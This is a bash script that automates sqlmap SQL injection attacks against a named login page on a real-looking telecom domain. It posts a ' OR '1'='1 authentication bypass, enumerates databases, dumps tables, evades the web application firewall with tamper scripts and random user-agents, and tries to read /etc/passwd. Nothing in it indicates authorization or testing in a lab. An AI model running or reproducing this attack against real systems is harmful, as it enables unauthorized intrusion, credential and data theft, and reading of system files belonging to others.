#!/bin/bash

# Replace the current Target Details with your Target Details.
TARGET_URL="https://dividend.sktelecom.com/login.do"
POST_DATA="username=admin&password=' OR '1'='1"

# Define the path to the tamper scripts
TAMPER_SCRIPTS="space2comment,randomcase"

# Define the log file path
LOGFILE="$HOME/Desktop/logsql.txt"

# Define a function to append output to the log file
log_command() {
    local command="$1"
    echo "[*] Running command: $command" >> "$LOGFILE"
    $command >> "$LOGFILE" 2>&1
    echo "[*] Command completed: $command" >> "$LOGFILE"
    echo "" >> "$LOGFILE"
}

# 1. Basic SQL Injection Test
log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 -v 6"

# 2. Enumerate the Databases
log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --dbs -v 6"

# 3. Dump Data from a Specific Table
DATABASE_NAME="your_database_name" # Replace with the actual database name
TABLE_NAME="your_table_name"         # Replace with the actual table name
log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 -D '$DATABASE_NAME' -T '$TABLE_NAME' --dump -v 6"

# 4. Identify Injection Points
log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=5 --risk=3 --identify-waf -v 6"

# 5. Use Tamper Scripts to Bypass WAF
log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --tamper='$TAMPER_SCRIPTS' -v 6"

# 6. Test for Injection via HTTP Headers
log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --headers='X-Forwarded-For: 127.0.0.1' -v 6"

# 7. Use Cookies for Injection Testing
log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --cookie='session=abc123' -v 6"

# 8. Use Different HTTP Methods
log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --method=POST -v 6"

# 9. Randomize User-Agent and Referer
log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --random-agent -v 6"

# 10. Check for SQL Injection via Files and Payloads
log_command "sqlmap -u '$TARGET_URL' --data='$POST_DATA' --batch --level=3 --risk=2 --file-read=/etc/passwd -v 6"

echo "[*] All tests completed. Results are saved in $LOGFILE."
